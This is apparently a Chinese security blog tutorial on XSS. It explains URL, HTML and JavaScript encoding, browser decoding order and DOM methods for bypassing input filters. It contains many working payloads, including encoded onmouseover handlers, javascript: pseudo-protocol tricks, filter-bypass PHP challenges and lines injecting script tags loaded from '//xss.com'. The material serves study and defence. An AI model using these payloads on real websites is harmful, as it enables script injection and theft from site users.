---
title: xss大杂烩
categories:
  - Web安全
tags:
  - xss
  - js
  - DOM
abbrlink: 296de3fc
date: 2018-10-26 17:11:58
---
&#8195;&#8195;首先强力推荐一个系列：**[腾讯实例教程] 那些年我们一起学XSS**，二哥当真无愧XSS第一人。原文贴不上了大家搜镜像吧。大家学习XSS时候都非常关注JS、HTML和CSS，比较容易忽视编码、解码和DOM相关的知识，一般也都以弹窗来衡量XSS是否成功，不过实践中想要调用外部JS还是非常依赖对DOM和编码解码的理解。
<!-- more -->

XSS绕过方法主要有字符编码、字符拼接、DOM构造和特殊符号处理异常等。我觉得一次成功的XSS主要有几点：
- js、html、css语言的掌握程度
- 对编码的理解
- 对浏览器解码的认识
- 经验
经验需要日积月累，我们可以先学习和巩固基础知识。

## 编码介绍
&#8195;&#8195;从编码说起：
&#8195;&#8195;先提一下Unicode和UTF-8的关系，Unicode是一个字符集，几乎包括了世界上所有的符号，它虽然规定了符号的二进制代码，却没有规定二进制代码如何存储。UTF-8就是一种编码规则，是一种可变字节的编码方式（1-4字节）；GBK则是固定2字节。
### URL编码
1. 格式
`%xx`，比如：
- `<` = `%3C`
- `>` = `%3E`
- `"` = `%22`
&#8195;&#8195;一个百分号 `%`，后面跟着两个表示字符ASCII码的十六进制数。非ASCII字符（如utf-8），需要使用ASCII字符集的超集进行编码得到相应的字节，然后对每个字节执行百分号编码。

2. 介绍
&#8195;&#8195;URL编码最初的设计，主要应该还是为了区别于保留字符吧，消除歧义（个人猜测），比如符号`&`是用于分隔url参数的，假如用户正常数据里包含 `&` ，可能使服务端解析产生歧义，当然，歧义也能产生安全问题。
只有**非保留字符**和位于**正确功能位置上的保留字符**才允许出现在URL里。其他字符，如不安全字符和不在正确功能位置上的保留字符（例如在查询组件中出现的 `/` ）等，需要出现在url里时都要经过编码才可以。此外还有一些受限字符（ASCII字符集的不可打印区间0x00-0x1F,0x7F以及大于0x7F的字符），也需要进行编码。
**非保留字符集：**英文字母 `a-zA-Z` 、数字 `0-9` 、4个特殊字符 `-_.~` 。
**保留字符集：**在url中有些字符被保留起来，有着特殊的意义，比如“/”作为路径组件中分隔路径段的定界符。RFC3986中指定的保留字符：`! * ‘ ( ) ; : @ & = + $ , / ? # [ ]` 。
**不安全字符：**还有一些字符，当他们直接放在Url中的时候，可能会引起解析程序的歧义。这些字符被视为不安全字符。如：``空格 ' < > # % { } | \ ^ [ ] ` ~`` 。

### HTML编码
1. 格式
`&xxx;`，比如：
- `<` = `&lt;`   = `&#60;` = `&#x3C`
- `>` = `&gt;`   = `&#62;` = `&#x3E`
- `"` = `&quot;` = `&#34;` = `&#x22`

&#8195;&#8195;就理解为实体名编码，实体进制编码吧。以 `&` 开头 `;` 结尾，中间是：
- 字符的 `实体名` （`;`可省略，如 `&lt` ）或者
- `#` 加字符的 `十进制数` 或者
- `#x` 加字符的 `十六进制数 `，见[文档](https://www.w3schools.com/html/html_entities.asp)：
```
&entity_name;
OR
&#entity_number;
```
&#8195;&#8195;实体名的好处是容易记，缺点是不一定被所有的浏览器识别，进制编码能被完美识别。

2. 介绍
HTML中某些字符是预留的，比如想正确的显示 `<` 、 `>` 而不是被误认为标签，就必须使用html实体编码。

### JS编码
1. 格式
`\xx`，比如：
- `<` = `\u003C` = `\x3C`
- `>` = `\u003E` = `\x3E`
- `"` = `\u0022` = `\x22`

&#8195;&#8195;在 `\u` 后面加4位16进制数，或者 `\x` 后面加2位16进制数。

2. 介绍
在一些硬件里，无法显示或输入Unicode字符全集。为了支持这些硬件，javascript定义了一种特殊序列，使用6个ascii字符来代表任意16位Unicode内码。

### 常见问题
摘抄：
1. 有时候只使用一种编码尽管不正确，但是似乎是可以解决XSS问题的，为什么还要使用组合编码？
> a) 敏感字符集不同，对于HTML来说，可能 `?` 号不是敏感字符，但是对于URL来说，它是敏感字符；
> b) 避免改变用户的输入，只有遵循浏览器解码机制，才是完全正确的，否则都会有这样那样的问题。

2. URL编码与URL参数编码的问题：
> a) 允不允许使用【Javascript:】+ 【javascript函数】类似这样的形式URL的问题是我们进行URL合法性检查的重要部分， 还有ftp://等多种协议；
> b) 关于URL编码与URL参数的编码，希望大家多做实验找找感觉。我个为认为我们只需要对URL的参数值进行真正意义上的URL编码，而类似于 `href`、`src`、`replace` 里一级URL，我们主要是对URL 进行合法性检查，至于为什么，一时半会说不明白，你亲自做实验，效果会更好；

3. 可以重复编码，只要你编码环境没判断错误，重复多少次都没问题；

4. 关于基于JSON数据进行前端复杂的UI绘制的web应用所涉及到的XSS问题，原理完全一致，只是由于语法环境不能一目了然而增加了开发人员判断的难度，但是搞清楚了原理，做对了，在你你fix XSS问题后就不会遇到诸多bug或者fix不彻底的问题。

## XSS中编码运用
### DOM事件中的编码
&#8195;&#8195;HTML DOM 事件允许 Javascript 在 HTML 文档元素中注册不同事件处理程序，事件通常与函数结合使用，函数不会在事件发生前被执行！DOM事件有好几种，比如鼠标事件中的onclick、框架/对象事件中的onerror、表单事件中的onfocus、拖动事件中的ondrag等很多，为了调试方便,观察直观，这里用 `onmouseover` 事件，鼠标指到input框即能看到效果。

&#8195;&#8195;比如输出点在 `<input value="xxx">` ，可拷贝如下代码本地调试：
```html
<br>
<input name="" value="onmouseover=alert(1)" 
onmouseover=alert(1) style="width:300px"><br>
<br>
<input name="" value="onmouseover=\alert\(2\)/\/" 
onmouseover=\alert\(2\)/\/ style="width:300px"><br>
<br>
<input name="" value="onmouseover=aler&#38;&#35;&#49;&#49;&#54;&#59;&#38;&#35;&#52;&#48;&#59;3)" 
onmouseover=aler&#116;&#40;3) style="width:300px"><br>
<br>
<input name="" value="onmouseover=aler\u0074(4)" 
onmouseover=aler\u0074(4) style="width:300px"><br>
<br>
<input name="" value="onmouseover=alert\u00285)" 
onmouseover=alert\u00285) style="width:300px"><br>
<br>
```
效果如图：
![encoding1](/imgs/encoding1.png)
哪些能成功，哪些不能？
1. 可以，正常语句，无编码；
2. 不可以，随机加入了转义字符，这个实际上是为了区别于JS引擎对 `\` 的处理；
3. 可以，对 `onmouseover=` 内的任意字符可以做html编码；
4. 可以，JS的字符编码，只能用在字符串中，不能用于符号、变量名或者函数名。
5. 不可以， 这里不可以对 `alert` 的左右括号做JS编码。

&#8195;&#8195;那假如过滤了 `( ) & \ < > '` ，而没有过滤双引号 `"`，该怎么构造呢？实体编码不行，JS编码又无法代替括号，我们可以想办法把 `alert()` 的括号变成字符串，用location加javascript伪协议。

### javascript伪协议
&#8195;&#8195;其实 `location` 对象后面本来应该是一个URl字符串，但是我们可以使用  `javascript:` 伪协议让字符串执行JS，可拷贝如下代码本地调试：
```html
<br>
<input name="a" value="onmouseover=location=&#34;javascript:alert(1)&#34;" 
onmouseover=location="javascript:alert(1)" style="width:500px"><br>
<br>
<input name="b" value="onmouseover=location=&#34;\javascript:\alert\(2\)/\/&#34;"
onmouseover=location="\javascript:\alert\(2\)/\/" style="width:500px"><br>
<br>
<input name="c" value="onmouseover&#38;&#35;61;location=&#34;javascript:alert(3)&#34;" 
onmouseover&#61;location="javascript:alert(3)" style="width:500px"><br>
<br>
<input name="d" value="onmouseover=locatio&#38;&#35;110;&#38;&#35;61;&#38;&#35;34;&#38;&#35;106;avascript&#38;&#35;58;aler&#38;&#35;116;&#38;&#35;x28;4)&#34;" 
onmouseover=locatio&#110;&#61;&#34;&#106;avascript&#58;aler&#116;&#x28;4)" style="width:500px"><br>
<br>
<input name="e" value="onmouseover=location=&#34;\u006aavascrip\x74\u003aaler\u0074\x285%29&#34;" 
onmouseover=location="\u006aavascrip\x74\u003aaler\u0074\x285%29" style="width:500px"><br>
<br>
<input name="f" value="onmouseover=location=\u0022javascript:alert(6)&#34;"
onmouseover=location=\u0022javascript:alert(6)" style="width:500px"><br>
<br>
<input name="g" value="onmouseover=location=&#34;javas&#34;+&#38;&#35;34;cript:alert\u00287)&#34;" 
onmouseover=location="javas"+&#34;cript:alert\u00287)" style="width:500px"><br>
<br>
<input name="h" value="onmouseover=locatio&#38;&#35;110;&#38;&#35;61;&#38;&#35;x22;javascrip\x74\u003aalert(8\u0029&#34;"
onmouseover=locatio&#110;&#61;&#x22;javascrip\x74\u003aalert(8\u0029" style="width:500px"><br>
<br>
```
效果如图：
![encoding2](/imgs/encoding2.png)
哪些能成功，哪些不能？
1. 可以，正常语句，无编码；
2. 可以，JS引擎读取代码时会把其中的js转义去掉；
3. 不可以，DOM事件包括事件的符号不可以进行html编码；
4. 可以，事件内的任意字符可以进行html编码；
5. 可以，`location` 加 `javascript伪协议` ，将“符号”、“变量名”、“函数名”统统变成“字符串”，在字符串中我们可以使用所有js里可以使用的编码，这里最后一个括号 `)` 还可以用URL编码；
6. 不可以，这里的双引号 `"` 是构成 `location`的一部分；
7. 可以，得益于我们之前将要执行的“函数”变成了“字符串”，这里还可以用拼接的形式，形如 `"javas"+"crip:alert(8)"` ；
8. 可以，这里对 `location` 做了html编码，对伪协议部分做了JS编码。  

拷贝2个P牛的例子给大家绕一下：
```php
<?php
header('X-XSS-Protection: 0');
$xss = isset($_GET['xss'])?$_GET['xss']:'';
$xss = str_replace(array("(",")","&","\\","<",">","'"), '', $xss);
echo "<img src=\"{$xss}\">";
?>
```

```php
<?php
header('X-XSS-Protection: 0');
$xss = isset($_GET['xss'])?$_GET['xss']:'';
$xss = str_replace(array("(",")","&","\\","<",">","'"), '', $xss);
if (preg_match('/(script|document|cookie|eval|setTimeout|alert)/', $xss)) {
    exit('bad');
}
echo "<img src=\"{$xss}\">";
?>
```
## 浏览器解码过程
&#8195;&#8195;HTML 是从上到下解析，遇到不同标签做不同解析，随着DOM节点或JS操作是一个往复渲染的过程。
先放一段简单的代码：
```html
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
</head>
<body>
<a href="javascript:alert('<?php echo $_GET['input'];?>');">test</a>
</body>
</html>
```
假如 `input` 内容为 `%26lt%5cu4e00%26gt` 。

### URL解码
&#8195;&#8195;这是所有流程的第一步，服务端收到请求，会根据url参数来调用相应的函数（路由），处理结果再返回给用户，所以服务端收到一个GET或POST等请求参数时会先做url解码，变为 `<a href="javascript:alert('&lt\u4e00&gt');"`，可以通过查看网页源代码看到 。

### HTML解码
&#8195;&#8195;浏览器收到服务端的数据，首先根据词法和语法分析的规则，匹配相应符号来构造DOM树，有了DOM节点，才能对html实体编码进行解码。DOM树构造好后，开始对DOM节点内容做html解码，href的内容被解码为 `<a href="javascript:alert('<\u4e00>');"` ，可以通过检查元素看到。

### CSS编码
&#8195;&#8195;一般来说，CSS 解析器会做接下来的工作，不过一般来说，为了考虑到更好的体验和性能，并不会等到所有的html都解析完成之后再去构建和布局render树。它是解析完一部分内容就显示一部分内容，同时，可能还在通过网络下载其余内容。不过CSS解码现在先不详解。

### JS解码
&#8195;&#8195;实际上，浏览器在遇到 `< script>` 、 `< style>` 等标签时候会自动切换到特殊解析模式，而 `javascript:` 是一个伪协议，也会进入JS 的解析模式，解码为 `<a href="javascript:alert('<一>');">` 。

### 总结
看代码：
```html
<html>
<body>
<h1>jiayzhan's item</h1>
<a ID="jiayzhan" onclick="alert('jiayzhan\'s onclick')" href="http://www.jiayzhan.org" ">jiayzhan's link</a>
</body>
<script>
location.replace("jiayzhan's URL")
</script>
</html>
```
下面一步一步来说浏览器是如何解码(反转义)的，我就用字符串本身作为位置标识来解释：
1. 位置：`jiayzhan’s item`， 浏览器在解析这个位置的字符串时，无论如何，会对其进行一次HTML解码；
2. 位置：`jiayzhan\’s onclick`，无论如何，浏览器会对其进行：1） 先做HTML解码  2）再做JS解码；
3. 位置: `http://www.jiayzhan.org`，无论如何，浏览器会对其进行：URL解码；
4. 位置：`jiayzhan’s URL`，无论如何，浏览器会对此位置字符串进行：1）先JavaScript解码  2）后URL解码。

## DOM操作
### 基础知识
**获取节点**
```
getElementById() 返回对拥有指定 ID 的第一个对象的引用
getElementsByTagName()返回带有指定名称的对象的集合
getElementsByClassName() 获取所有指定类名的元素
```
**新增节点**
```
document.createElement() 创建节点对象，参数是字符串也就是html标签
createTextNode 创建文本节点，配合上一个使用
appendChild(element) 把新的结点添加到指定节点下，参数是一个节点对象
insertChild() 在指定结点钱插入新的节点
```
**修改节点**
```
replaceChild() 节点交换
setAttribute() 设置属性
```
**删除节点**
```
removeChild(element) 删除节点，要先获得父节点然后再删除子节点
```
**一些DOM属性**
```
innerHTML 设置或返回表格行的开始和结束标签之间的 HTML
parentNode 当前节点的父节点
childNode 子节点
attributes 节点属性
style 修改样式

firstElementChild 第一个子元素节点
lastElementChild 最后一个子元素节点
nextElementSibling 下一个兄弟元素节点
previousElementSibling 前一个兄弟元素节点
```

### 利用
**修改属性的值**
假如我们可以控制value的输入，那么可以使用 `getElementsByTagName()` ：
```html
<input name="" value="指向我修改第2个script标签的src值" 
onmouseover="document.getElementsByTagName('script')[1].src='change1'" style="width:300px"><br>

<input name="" value="指向我又修改了第2个script标签的src值" 
onmouseover="document['getElem'+'entsByTagName']('script')[1].src='change2'" style="width:300px"><br>
```
`getElementById()` 可以配合一些属性比如 `innerHTML`，下面再举例。

**增加节点**
假如我们可以控制value的输入，那么结合 `createElement()`、`appendChild(element)` ：
```html
<input name="" value="指向我增加一个src属性为new1的script标签" 
onmouseover="s=document.createElement('script');s.src='//xss.com/new1';document.body.appendChild(s)" style="width:300px"><br>

<input name="" value="指向我增加一个src属性为new2的script标签" 
onmouseover="document.body.appendChild(document.createElement(String.fromCharCode(115,99,114,105,112,116))).src='//xss.com/new2'" style="width:300px"><br>

<input name="" value="指向我增加一个src属性为new3的script标签" 
onmouseover="with(document)body.appendChild(createElement('script')).src='//xss.com/new3'" style="width:300px"><br>
```
**修改元素内的值**
假如我们可以控制 `<td>` 元素的输入，那么结合 `innerTEXT`、`innerHTML`、`parentNode` ：
```html
<table border="1">
<tr>
<td>row1</td>
<td>row2</td>
<td>javascript:alert("row3")</td>
<td onmouseover=location=this.parentNode.children[2].innerText>指向我会弹窗</td>
<td onmouseover=location=this.parentNode.firstElementChild.nextElementSibling.nextElementSibling.innerText>指向我也会弹窗</td>
<td>row6</td>
</tr>
</table>
```
`innerTEXT` 和 `innerHTML` 有什么区别呢？修改第二个 `<td>` 元素为 `<td><b>row1</b></td>` 尝试一下。

## 问题&引申
### html、js编码
编码看多了容易混淆，比如：`onerror=alert()` 的
html编码是 `onerror=alert&#40&#41` ；
js编码不是 ~~`onerror=alert\u0040\u0041`~~ ；
而是 `onerror=alert\u0028\u0029` ，上面html编码形式是10进制的。
html编码还可以 `onerror=alert&#x28&#x29` ，16进制形式。
主要是进制的问题，当然也不是说你40绕不过去28就能绕过去，只是了解一下编码，不要混淆。

顺便 `fromCharCode()` 可接受一个指定的 Unicode 值，然后返回一个字符串：
```html
<script type="text/javascript">
document.write(String.fromCharCode(72,69,76,76,79))
document.write("<br />")
document.write(String.fromCharCode(65,66,67))
</script>
```

### 自执行函数
&#8195;&#8195;如果把代码直接写到script标签里，当页面加载完这个script标签就会执行里边的代码了。如果在这代码里用到了未加载的dom或者调用了未加载的方法，是会报错的。
```js
function(){alert(1)}()
```
详细资料看这里：[学习js函数--自执行函数](https://www.cnblogs.com/jiangshichao/p/7152855.html)。

### Onfoucus 和 Tabindex
**Onfocus**
&#8195;&#8195;`Onfocus` 事件在对象获得焦点时发生，比如左键或者右键点击了输入框，常用于 `<input>`、`<select>` 和 `<a>`，与其相反的事件为 `onblur` 事件。

**Tabindex**
&#8195;&#8195;`Tabindex` 属性规定元素的 tab 键控制次序（当 tab 键用于导航时），以下元素支持 `Tabindex` 属性：`<a>`、`<area>`、`<button>`、`<input>`、`<object>`、`<select>` 以及 `<textarea>`。
&#8195;&#8195;把控件的tabIndex属性设成1到32767的一个值，就可以把这个控件加入到TAB键的序列中，当浏览者使用TAB键在网页控件中移动时，将首先移动到具有最小tabIndex属性值的控件上，最后在具有最大tabIndex属性值的控件上结束移动，如果有两个控件的tabIndex属性相同，则以控件在html代码中出现的顺序为准。默认的tabIndex属性为 0 ，将排列在在所有指定 `TabIndex` 的控件之后，而若把 `TabIndex` 属性设为一个负值，那么这个链接将被排除在TAB键的序列之外。
&#8195;&#8195;有的URL默认带有锚点，想要直接触发XSS可能需要配合 `Tabindex` 使用。

## 参考
[XSS学习](http://www.hekaiyu.cn/xss)
[浅谈浏览器的编码与解码过程](https://blog.csdn.net/he_and/article/details/77963446)
[XSS解决方案系列之二：知其所以然—浏览器是如是解码的](https://www.freebuf.com/articles/web/10121.html)
[XSS解决方案系列之四：关于编码](https://www.freebuf.com/articles/web/10478.html)
[利用location来变形我们的XSS Payload](https://www.leavesongs.com/PENETRATION/use-location-xss-bypass.html)
[那些年我们一起学XSS](https://wizardforcel.gitbooks.io/xss-naxienian/content/index.html)
